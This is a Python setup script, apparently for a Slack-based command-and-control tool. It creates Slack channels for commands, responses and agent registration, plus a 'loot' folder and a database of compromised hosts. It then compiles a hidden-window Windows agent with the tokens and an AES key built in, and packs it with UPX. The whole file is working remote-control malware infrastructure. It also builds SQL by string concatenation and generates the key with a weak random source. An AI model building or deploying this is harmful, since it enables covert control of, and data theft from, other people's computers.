import os
import sys
import json
import random
import sqlite3
import requests
import subprocess

# Initialize variables
commands = None
responses = None
registration = None

# Create directories
if not os.path.exists("loot"):
    os.mkdir("loot")
if not os.path.exists("output"):
    os.mkdir("output")

print("Ensure your Slack app has these permissions before you continue:"
      "\nchannels:history\nchannels:read\nchannels:write \nfiles:write:user\nfiles:read\n"
      "You must also create a Slack bot")
token = input("Enter the OAuth Access Token: ")
bearer = input("Enter the Bot User OAuth Access Token: ")

print("OAuth Access Token: " + token)
print("Bot User OAuth Access Token: " + bearer)

print("Attempting to create Slack channels...")

# Check if channels exist
headers = {'Authorization': 'Bearer ' + bearer}
data = {"token": token, "name": "commands", "validate": "True"}
r = requests.get('https://slack.com/api/channels.list', headers=headers)
result = json.loads(r.text)
for channel in result["channels"]:
        if channel["name"] == "commands":
            commands = channel["id"]
            print("Existing commands channel found")
        if channel["name"] == "registration":
            registration = channel["id"]
            print("Existing registration channel found")
        if channel["name"] == "responses":
            responses = channel["id"]
            print("Existing response channel found")

# Create channels
headers = {'Authorization': 'Bearer ' + bearer}
if commands is None:
    data = {"token": token, "name": "commands", "validate": "True"}
    r = requests.post('https://slack.com/api/channels.create', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        commands = result["channel"]["id"]
        print("Commands channel: " + commands)
    except KeyError:
        print(result)
        print("Commands channel already exists, log into Slack and delete it manually")
        print("Go to: Channel Settings -> Additional Options - > Delete this Channel")
        sys.exit()

if responses is None:
    data = {"token": token, "name": "responses"}
    r = requests.post('https://slack.com/api/channels.create', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        responses = result["channel"]["id"]
        print("Responses channel: " + responses)
    except KeyError:
        print("Responses channel already exists, log into Slack and delete it manually")
        print("Go to: Channel Settings -> Additional Options - > Delete this Channel")
        sys.exit()

if registration is None:
    data = {"token": token, "name": "registration"}
    r = requests.post('https://slack.com/api/channels.create', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        registration = result["channel"]["id"]
        print("Registration channel: " + registration)
    except KeyError:
        print("Registration channel already exists, log into Slack and delete it manually")
        print("Go to: Channel Settings -> Additional Options - > Delete this Channel")
        sys.exit()

try:
    os.remove('slackor.db')
    print("Deleting current database...")
except OSError:
    pass
conn = sqlite3.connect('slackor.db')
print("Creating AES key...")
AESkey = ''.join(random.choice('0123456789ABCDEF') for n in range(32))
print(AESkey)
print("Created new database file...")
print("Putting keys in the database...")
# Create table for  keys
conn.execute('''CREATE TABLE KEYS
         (ID TEXT PRIMARY KEY     NOT NULL,
         TOKEN           TEXT    NOT NULL,
         BEARER           TEXT    NOT NULL,
         AES            TEXT     NOT NULL);''')
conn.execute("INSERT INTO KEYS (ID,TOKEN,BEARER,AES) VALUES ('1', '" + token + "','" + bearer + "','" + AESkey + "')")

print("Adding slack channels to the database...")

# Create table for channels
conn.execute('''CREATE TABLE CHANNELS
         (ID TEXT PRIMARY KEY     NOT NULL,
         COMMANDS           TEXT    NOT NULL,
         RESPONSES            TEXT     NOT NULL,
         REGISTRATION        TEXT);''')
conn.execute("INSERT INTO CHANNELS (ID,COMMANDS,RESPONSES,REGISTRATION) VALUES ('1', '" + commands + "','"
             + responses + "','" + registration + "')")

# Create table for holding agents
conn.execute('''CREATE TABLE AGENTS
         (ID TEXT PRIMARY KEY     NOT NULL,
         HOSTNAME           TEXT    NOT NULL,
         USER           TEXT    NOT NULL,
         IP            TEXT     NOT NULL,
         VERSION        TEXT);''')
conn.commit()
conn.close()
print("Database created successfully")

# Build exe and pack with UPX
subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -ldflags \"-s -w -H windowsgui -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
subprocess.run(["bash", "-c", "upx --force agent.exe"])
